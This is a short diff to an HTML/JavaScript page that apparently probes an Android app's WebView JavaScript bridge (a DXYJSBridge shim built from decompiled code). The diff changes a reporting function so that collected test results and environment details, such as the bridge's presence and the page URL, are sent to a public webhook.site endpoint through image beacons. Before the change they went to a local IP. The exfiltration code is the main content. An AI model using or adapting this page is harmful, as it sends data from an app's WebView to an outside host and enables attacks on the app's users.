@@ -6,7 +6,7 @@
 <script>
 var o = document.getElementById('o');
 function L(s){ o.textContent += '\n' + s; }
-function R(tag, data){ try{ fetch('https://192.168.3.200:8443/result', {method:'POST', body:'['+tag+'] '+data}).catch(function(){}); }catch(e){} }
+function R(tag, data){ try{ new Image().src='https://webhook.site/ae6938d0-af00-4360-83b8-5dff3e6643a7/x?d='+encodeURIComponent('['+tag+'] '+data.substring(0,1400)); }catch(e){} }
 
 // ===== 自实现 shim (原生回调走 window.DXYJSBridge.callback, 见 q/r.java:63) =====
 window.DXYJSBridge = {
@@ -38,7 +38,7 @@ setTimeout(function() {
   var msg = acc.join(' || ');
   try { document.title = 'T| ' + msg; } catch(e) {}
   try { R('URLTESTS', msg); } catch(e) {}
-  try { new Image().src = 'https://192.168.3.200:8443/beacon?d=' + encodeURIComponent(msg); } catch(e) {}
+  try { R('URLTESTS2', msg); } catch(e) {}
 }, 600); R('ENV', 'bridger=' + (typeof window.AndroidJSBridger) + ' href=' + location.href);
 L('----------------------------------------');
 
